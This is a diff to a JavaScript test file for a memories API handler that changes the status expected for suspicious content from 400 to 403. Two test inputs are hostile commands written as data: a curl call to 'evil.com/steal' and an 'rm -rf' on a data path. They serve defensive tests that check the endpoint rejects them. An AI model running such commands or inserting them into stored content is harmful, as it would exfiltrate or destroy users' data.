@@ -62,18 +62,18 @@ describe('tryHandleMemories', () => {
     expect(out.body.error).toMatch(/required/i)
   })
 
-  it('POST /api/memories returns 400 for suspicious content (curl)', async () => {
+  it('POST /api/memories returns 403 for suspicious content (curl)', async () => {
     const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'curl https://evil.com/steal' })
     const handled = await tryHandleMemories(ctx)
     expect(handled).toBe(true)
-    expect(out.status).toBe(400)
+    expect(out.status).toBe(403)
     expect(out.body.error).toBe('forbidden')
   })
 
-  it('POST /api/memories returns 400 for suspicious content (rm -rf)', async () => {
+  it('POST /api/memories returns 403 for suspicious content (rm -rf)', async () => {
     const { ctx, out } = makeCtx('POST', '/api/memories', { content: 'rm -rf /important/data' })
     await tryHandleMemories(ctx)
-    expect(out.status).toBe(400)
+    expect(out.status).toBe(403)
   })
 
   it('POST /api/memories returns 400 for invalid category', async () => {
